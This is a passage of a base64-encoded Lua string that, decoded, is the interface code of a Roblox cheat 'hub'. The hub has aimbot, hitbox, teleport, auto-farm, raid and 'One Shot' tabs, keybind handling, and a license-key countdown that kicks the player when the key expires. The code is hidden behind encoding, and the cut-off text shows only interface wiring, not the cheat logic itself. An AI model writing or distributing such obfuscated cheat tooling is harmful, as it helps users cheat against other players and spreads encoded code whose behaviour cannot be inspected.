pYmxlID0gdHJ1ZQogICAgICAgICAgICBSaWdodFRhYkNvbnRhaW5lci5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgUmlnaHRQYWdlQ29udGFpbmVyLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICBQYXRjaE5vdGVzUGFnZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgUmlnaHRUaXRsZS5UZXh0ID0gIkNVU1RPTSBIVUIiCiAgICAgICAgICAgIEJhY2tCdG4uVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgIGlzU29jaWFsc09wZW4gPSBmYWxzZQogICAgICAgIGVsc2UKICAgICAgICAgICAgSHViTWVudS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgUmlnaHRUYWJDb250YWluZXIuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgIFJpZ2h0UGFnZUNvbnRhaW5lci5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgUGF0Y2hOb3Rlc1BhZ2UuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgUmlnaHRUaXRsZS5UZXh0ID0gIlBBVENIIE5PVEVTIgogICAgICAgICAgICBCYWNrQnRuLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIGlzU29jaWFsc09wZW4gPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGxvY2FsIEJldGFMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIEJldGFMYWJlbC5UZXh0ID0gIkJFVEEiCiAgICBCZXRhTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxNSkKICAgIEJldGFMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAxLCAtMTUpCiAgICBCZXRhTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMSwgLTI1KQogICAgQmV0YUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBCZXRhTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDYwLCA2MCwgNzApCiAgICBCZXRhTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBCZXRhTGFiZWwuVGV4dFNpemUgPSAxMAogICAgQmV0YUxhYmVsLlBhcmVudCA9IFJpZ2h0UGFuZWwKICAgIAogICAgLS0gPT09IEtFWSBUSU1FUiBJTiBIVUIgPT09CiAgICBsb2NhbCBLZXlUaW1lTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBLZXlUaW1lTGFiZWwuTmFtZSA9ICJLZXlUaW1lTGFiZWwiCiAgICBLZXlUaW1lTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxNSkKICAgIEtleVRpbWVMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAxLCAtNTUpCiAgICBLZXlUaW1lTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIEtleVRpbWVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKQogICAgS2V5VGltZUxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgS2V5VGltZUxhYmVsLlRleHRTaXplID0gMTAKICAgIEtleVRpbWVMYWJlbC5UZXh0ID0gIkxpZmV0aW1lIEtleSIKICAgIEtleVRpbWVMYWJlbC5QYXJlbnQgPSBSaWdodFBhbmVsCgogICAgaWYga2V5RHVyYXRpb24gYW5kIGtleUR1cmF0aW9uIDwgODAwMDAwMDAwIHRoZW4KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgZW5kVGltZSA9IHRpY2soKSArIGtleUR1cmF0aW9uCiAgICAgICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgYW5kIHRpY2soKSA8IGVuZFRpbWUgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHJlbSA9IGVuZFRpbWUgLSB0aWNrKCkKICAgICAgICAgICAgICAgIGxvY2FsIGggPSBtYXRoLmZsb29yKHJlbSAvIDM2MDApCiAgICAgICAgICAgICAgICBsb2NhbCBtID0gbWF0aC5mbG9vcigocmVtICUgMzYwMCkgLyA2MCkKICAgICAgICAgICAgICAgIGxvY2FsIHMgPSBtYXRoLmZsb29yKHJlbSAlIDYwKQogICAgICAgICAgICAgICAgS2V5VGltZUxhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCJFeHBpcmVzOiAlMDJkOiUwMmQ6JTAyZCIsIGgsIG0sIHMpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIHRpY2soKSA+PSBlbmRUaW1lIHRoZW4gcGxheWVyOktpY2soIktleSBFeHBpcmVkIikgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgLS0gQmFjayBCdXR0b24gKEhpZGRlbiBieSBkZWZhdWx0KQogICAgbG9jYWwgQmFja0J0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBCYWNrQnRuLlRleHQgPSAiPCIKICAgIEJhY2tCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLCAyMCwgMCwgMjApCiAgICBCYWNrQnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDUsIDAsIDUpCiAgICBCYWNrQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDMwKQogICAgQmFja0J0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgIEJhY2tCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBCYWNrQnRuLlRleHRTaXplID0gMTIKICAgIEJhY2tCdG4uUGFyZW50ID0gUmlnaHRQYW5lbAogICAgQmFja0J0bi5WaXNpYmxlID0gZmFsc2UKICAgIAogICAgbG9jYWwgQmFja0Nvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgQmFja0Nvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQogICAgQmFja0Nvcm5lci5QYXJlbnQgPSBCYWNrQnRuCgogICAgLS0gSGVscGVyIHRvIG1hbmFnZSBMZWZ0IFBhbmVsIFRhYnMKICAgIGxvY2FsIGZ1bmN0aW9uIHNldExlZnRUYWJzKG1vZGUpCiAgICAgICAgZm9yIF8sIGJ0biBpbiBwYWlycyhUYWJCdG5zKSBkbyBidG4uVmlzaWJsZSA9IGZhbHNlIGVuZAogICAgICAgIAogICAgICAgIGlmIG1vZGUgPT0gIlBWUCIgdGhlbgogICAgICAgICAgICBUYWJCdG5zLlBsYXllcnMuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgVGFiQnRucy5WaXN1YWxzLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIFRhYkJ0bnMuQWltLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIFRhYkJ0bnMuSGl0Ym94LlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIFRhYkJ0bnMuVGVsZXBvcnQuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgZm9yIF8sIGJ0biBpbiBwYWlycyhUYWJCdG5zKSBkbyBidG4uU2l6ZSA9IFVEaW0yLm5ldygwLjIsIC00LCAxLCAwKSBlbmQKICAgICAgICAgICAgc3dpdGNoVGFiKCJQbGF5ZXJzIikKICAgICAgICBlbHNlaWYgbW9kZSA9PSAiRmFybSIgdGhlbgogICAgICAgICAgICBUYWJCdG5zLkZhcm1TY3JpcHRzLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIFRhYkJ0bnMuRmFybVNldHRpbmdzLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIFRhYkJ0bnMuRmFybVN0YXR1cy5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICBUYWJCdG5zLkZhcm1GYXJtaW5nLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIGZvciBfLCBidG4gaW4gcGFpcnMoVGFiQnRucykgZG8gCiAgICAgICAgICAgICAgICBpZiBidG4uVmlzaWJsZSB0aGVuIGJ0bi5TaXplID0gVURpbTIubmV3KDAuMjUsIC00LCAxLCAwKSBlbmQgCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBzd2l0Y2hUYWIoIkZhcm1TY3JpcHRzIikKICAgICAgICBlbHNlaWYgbW9kZSA9PSAiRHVuZ2VvbiIgdGhlbgogICAgICAgICAgICBUYWJCdG5zLlJhaWQuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgVGFiQnRucy5SYWlkLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICAgICAgc3dpdGNoVGFiKCJSYWlkIikKICAgICAgICBlbHNlaWYgbW9kZSA9PSAiU2V0dGluZ3MiIHRoZW4KICAgICAgICAgICAgVGFiQnRucy5TZXR0aW5ncy5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICBUYWJCdG5zLlNldHRpbmdzLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICAgICAgc3dpdGNoVGFiKCJTZXR0aW5ncyIpCiAgICAgICAgZWxzZWlmIG1vZGUgPT0gIlNob3AiIHRoZW4KICAgICAgICAgICAgVGFiQnRucy5TaG9wLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIFRhYkJ0bnMuU2hvcC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgICAgIHN3aXRjaFRhYigiU2hvcCIpCiAgICAgICAgZWxzZWlmIG1vZGUgPT0gIlNlYUV2ZW50IiB0aGVuCiAgICAgICAgICAgIFRhYkJ0bnMuU2VhRXZlbnQuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgVGFiQnRucy5TZWFFdmVudC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgICAgIHN3aXRjaFRhYigiU2VhRXZlbnQiKQogICAgICAgIGVsc2VpZiBtb2RlID09ICJDdXN0b20iIHRoZW4KICAgICAgICAgICAgVGFiQnRucy5DdXN0b20uVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgVGFiQnRucy5DdXN0b20uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgICAgICBzd2l0Y2hUYWIoIkN1c3RvbSIpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgQmFja0J0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBIdWJNZW51LlZpc2libGUgPSB0cnVlCiAgICAgICAgUmlnaHRUYWJDb250YWluZXIuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgUmlnaHRQYWdlQ29udGFpbmVyLlZpc2libGUgPSBmYWxzZQogICAgICAgIFBhdGNoTm90ZXNQYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIFJpZ2h0VGl0bGUuVGV4dCA9ICJDVVNUT00gSFVCIgogICAgICAgIFNvY2lhbHNQYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGlzU29jaWFsc09wZW4gPSBmYWxzZQogICAgICAgIEJhY2tCdG4uVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgLS0gUmVzdG9yZSBwYWdlcyB0byBMZWZ0IFBhbmVsCiAgICAgICAgZm9yIG5hbWUsIHBhZ2UgaW4gcGFpcnMoUGFnZXMpIGRvCiAgICAgICAgICAgIHBhZ2UuUGFyZW50ID0gUGFnZUNvbnRhaW5lcgogICAgICAgICAgICBwYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHN3aXRjaFRhYigiUGxheWVycyIpCiAgICBlbmQpCiAgICAKICAgIFJldHVybkh1YkJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBIdWJNZW51LlZpc2libGUgPSB0cnVlCiAgICAgICAgUmlnaHRUYWJDb250YWluZXIuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgUmlnaHRQYWdlQ29udGFpbmVyLlZpc2libGUgPSBmYWxzZQogICAgICAgIFBhdGNoTm90ZXNQYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIFJpZ2h0VGl0bGUuVGV4dCA9ICJDVVNUT00gSFVCIgogICAgICAgIFNvY2lhbHNQYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGlzU29jaWFsc09wZW4gPSBmYWxzZQogICAgICAgIEJhY2tCdG4uVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgLS0gUmVzdG9yZSBwYWdlcyB0byBMZWZ0IFBhbmVsCiAgICAgICAgZm9yIG5hbWUsIHBhZ2UgaW4gcGFpcnMoUGFnZXMpIGRvCiAgICAgICAgICAgIHBhZ2UuUGFyZW50ID0gUGFnZUNvbnRhaW5lcgogICAgICAgICAgICBwYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHN3aXRjaFRhYigiUGxheWVycyIpCiAgICBlbmQpCiAgICAKICAgIEZhcm1CdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgc2V0TGVmdFRhYnMoIkZhcm0iKQogICAgZW5kKQogICAgCiAgICBQVlBCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgc2V0TGVmdFRhYnMoIlBWUCIpCiAgICBlbmQpCiAgICAKICAgIFNob3BCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgc2V0TGVmdFRhYnMoIlNob3AiKQogICAgZW5kKQogICAgCiAgICBDdXN0b21CdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgc2V0TGVmdFRhYnMoIkN1c3RvbSIpCiAgICBlbmQpCgogICAgU2V0dGluZ3NCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgc2V0TGVmdFRhYnMoIlNldHRpbmdzIikKICAgIGVuZCkKICAgIAogICAgc3dpdGNoVGFiKCJQbGF5ZXJzIikKCiAgICAtLSA9PT0gVUkgRUxFTUVOVFMgQ1JFQVRJT04gPT09CgogICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlU2VjdGlvbihwYXJlbnQsIHRleHQsIG9yZGVyKQogICAgICAgIGxvY2FsIExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIExhYmVsLlRleHQgPSB0ZXh0OnVwcGVyKCkKICAgICAgICBMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDIwKQogICAgICAgIExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgOTApCiAgICAgICAgTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgTGFiZWwuVGV4dFNpemUgPSA4CiAgICAgICAgTGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICBMYWJlbC5MYXlvdXRPcmRlciA9IG9yZGVyCiAgICAgICAgTGFiZWwuUGFyZW50ID0gcGFyZW50CiAgICAgICAgCiAgICAgICAgbG9jYWwgUGFkID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciKQogICAgICAgIFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDIpCiAgICAgICAgUGFkLlBhcmVudCA9IExhYmVsCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVLZXliaW5kKHBhcmVudCwgdGV4dCwgY29uZmlnS2V5LCBvcmRlcikKICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgRnJhbWUuTGF5b3V0T3JkZXIgPSBvcmRlcgogICAgICAgIEZyYW1lLlBhcmVudCA9IHBhcmVudAoKICAgICAgICBsb2NhbCBDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykKICAgICAgICBDb3JuZXIuUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICBTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDQ1KQogICAgICAgIFN0cm9rZS5UaGlja25lc3MgPSAxCiAgICAgICAgU3Ryb2tlLlBhcmVudCA9IEZyYW1lCgogICAgICAgIGxvY2FsIExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIExhYmVsLlRleHQgPSB0ZXh0CiAgICAgICAgTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjcsIDAsIDEsIDApCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgICAgIExhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgTGFiZWwuVGV4dFNpemUgPSAodGV4dCA9PSAiT25lIFNob3QgKE5lZWQgQW50aSBIYXVudGVkKSIpIGFuZCA3IG9yIDkKICAgICAgICBMYWJlbC5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIFBhZCA9IEluc3RhbmNlLm5ldygiVUlQYWRkaW5nIikKICAgICAgICBQYWQuUGFkZGluZ0xlZnQgPSBVRGltLm5ldygwLCAxMCkKICAgICAgICBQYWQuUGFyZW50ID0gTGFiZWwKCiAgICAgICAgbG9jYWwgQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLjI1LCAwLCAwLjcsIDApCiAgICAgICAgQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNzIsIDAsIDAuMTUsIDApCiAgICAgICAgQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgIEJ1dHRvbi5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBCdXR0b24uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgQnV0dG9uLlRleHRTaXplID0gOAogICAgICAgIEJ1dHRvbi5QYXJlbnQgPSBGcmFtZQogICAgICAgIEJ1dHRvbi5aSW5kZXggPSAxMDAKICAgICAgICAKICAgICAgICBsb2NhbCBrZXkgPSBDb25maWdbY29uZmlnS2V5XQogICAgICAgIGxvY2FsIGtleU5hbWUgPSAiLi4uIgogICAgICAgIGlmIGtleSBhbmQgdHlwZW9mKGtleSkgPT0gIkVudW1JdGVtIiB0aGVuCiAgICAgICAgICAgIGlmIGtleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgICAgICBrZXlOYW1lID0ga2V5Lk5hbWUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgQnV0dG9uLlRleHQgPSBrZXlOYW1lCiAgICAgICAgS2V5YmluZEJ1dHRvbnNbY29uZmlnS2V5XSA9IEJ1dHRvbgogICAgICAgIAogICAgICAgIGxvY2FsIEJDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgQkNvcm5lci5QYXJlbnQgPSBCdXR0b24KICAgICAgICAKICAgICAgICBsb2NhbCBCU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICAgICAgQlN0cm9rZS5Db2xvciA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgQlN0cm9rZS5UaGlja25lc3MgPSAxLjUKICAgICAgICBCU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDAuNwogICAgICAgIEJTdHJva2UuUGFyZW50ID0gQnV0dG9uCgogICAgICAgIGxvY2FsIGlzV2FpdGluZ0ZvcktleSA9IGZhbHNlCgogICAgICAgIEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgaXNXYWl0aW5nRm9yS2V5IHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaXNXYWl0aW5nRm9yS2V5ID0gdHJ1ZQogICAgICAgICAgICBCdXR0b24uVGV4dCA9ICJQcmVzcyBhIGtleS4uLiIKICAgICAgICAgICAgQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig1MCwgNTAsIDgwKQogICAgICAgICAgICBCU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDAuMwogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgb2xkS2V5Q29kZSA9IENvbmZpZ1tjb25maWdLZXldCiAgICAgICAgICAgIGxvY2FsIGNvbm5lY3Rpb24KICAgICAgICAgICAgY29ubmVjdGlvbiA9IFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBnYW1lUHJvY2Vzc2VkKQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuS2V5Ym9hcmQgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkVzY2FwZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIEFubnVsZXIgLSByZXZlbmlyIMOgIGwnYW5jaWVubmUgdG91Y2hlCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZ1tjb25maWdLZXldID0gb2xkS2V5Q29kZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBvbGRLZXlDb2RlIGFuZCB0eXBlb2Yob2xkS2V5Q29kZSkgPT0gIkVudW1JdGVtIiBhbmQgb2xkS2V5Q29kZSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCdXR0b24uVGV4dCA9IG9sZEtleUNvZGUuTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCdXR0b24uVGV4dCA9ICIuLi4iCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgICAgICAgICAgICAgICAgIEJTdHJva2UuVHJhbnNwYXJlbmN5ID0gMC43CiAgICAgICAgICAgICAgICAgICAgICAgIGlzV2FpdGluZ0ZvcktleSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAtLSBBc3NpZ25lciBsYSBub3V2ZWxsZSB0b3VjaGUKICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnW2NvbmZpZ0tleV0gPSBpbnB1dC5LZXlDb2RlCiAgICAgICAgICAgICAgICAgICAgICAgIEJ1dHRvbi5UZXh0ID0gaW5wdXQuS2V5Q29kZS5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIEJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgICAgICAgICAgICAgICAgICAgICAgQlN0cm9rZS5UcmFuc3BhcmVuY3kgPSAwLjcKICAgICAgICAgICAgICAgICAgICAgICAgaXNXYWl0aW5nRm9yS2V5ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgY29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlSW5wdXQocGFyZW50LCB0ZXh0LCBjb25maWdLZXksIG9yZGVyKQogICAgICAgIGxvY2FsIEZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBGcmFtZS5MYXlvdXRPcmRlciA9IG9yZGVyCiAgICAgICAgRnJhbWUuUGFyZW50ID0gcGFyZW50CgogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgICAgIENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKQogICAgICAgIENvcm5lci5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIFN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQogICAgICAgIFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDM1LCAzNSwgNDUpCiAgICAgICAgU3Ryb2tlLlRoaWNrbmVzcyA9IDEKICAgICAgICBTdHJva2UuUGFyZW50ID0gRnJhbWUKCiAgICAgICAgbG9jYWwgTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgTGFiZWwuVGV4dCA9IHRleHQKICAgICAgICBMYWJlbC5TaXplID0gVURpbTIubmV3KDAuNiwgMCwgMSwgMCkKICAgICAgICBMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIExhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtTWVkaXVtCiAgICAgICAgTGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICBMYWJlbC5UZXh0U2l6ZSA9IDkKICAgICAgICBMYWJlbC5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIFBhZCA9IEluc3RhbmNlLm5ldygiVUlQYWRkaW5nIikKICAgICAgICBQYWQuUGFkZGluZ0xlZnQgPSBVRGltLm5ldygwLCAxMCkKICAgICAgICBQYWQuUGFyZW50ID0gTGFiZWwKCiAgICAgICAgbG9jYWwgSW5wdXQgPSBJbnN0YW5jZS5uZXcoIlRleHRCb3giKQogICAgICAgIElucHV0LlNpemUgPSBVRGltMi5uZXcoMC4zNSwgMCwgMC43LCAwKQogICAgICAgIElucHV0LlBvc2l0aW9uID0gVURpbTIubmV3KDAuNjIsIDAsIDAuMTUsIDApCiAgICAgICAgSW5wdXQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9y" .. "My5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgSW5wdXQuVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgSW5wdXQuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgSW5wdXQuVGV4dFNpemUgPSA4CiAgICAgICAgSW5wdXQuVGV4dCA9IHRvc3RyaW5nKENvbmZpZ1tjb25maWdLZXldKQogICAgICAgIElucHV0LlBhcmVudCA9IEZyYW1lCgogICAgICAgIElucHV0Qm94ZXNbY29uZmlnS2V5XSA9IElucHV0CgogICAgICAgIGxvY2FsIElDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBJQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgSUNvcm5lci5QYXJlbnQgPSBJbnB1dAoKICAgICAgICBJbnB1dC5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIHR5cGUoQ29uZmlnW2NvbmZpZ0tleV0pID09ICJzdHJpbm